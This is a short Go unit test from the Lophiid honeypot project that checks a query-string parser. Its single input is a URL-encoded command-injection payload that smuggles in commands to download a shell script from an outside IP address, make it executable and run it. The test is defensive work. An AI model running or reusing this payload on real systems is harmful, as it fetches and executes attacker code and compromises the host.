// Lophiid distributed honeypot
// Copyright (C) 2024 Niels Heinen
//
// This program is free software; you can redistribute it and/or modify it
// under the terms of the GNU General Public License as published by the
// Free Software Foundation; either version 2 of the License, or (at your
// option) any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
// or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License
// for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
//
package util

import "testing"

func TestCustomParseQuery(t *testing.T) {

	res, err := CustomParseQuery("path=%22;cd%20%2Fvar%3Bwget%20http%3A%2F%2F45.128.232.229%2Fcgi-dns.sh%3Bchmod%20%2Bx%20cgi-dns.sh%3Bsh%20cgi-dns.sh%22")

	if err != nil {
		t.Errorf("got unexpected error %v", err)
	}

	if len(res) != 1 {
		t.Errorf("expected 1 result, got %d", len(res))
	}
}
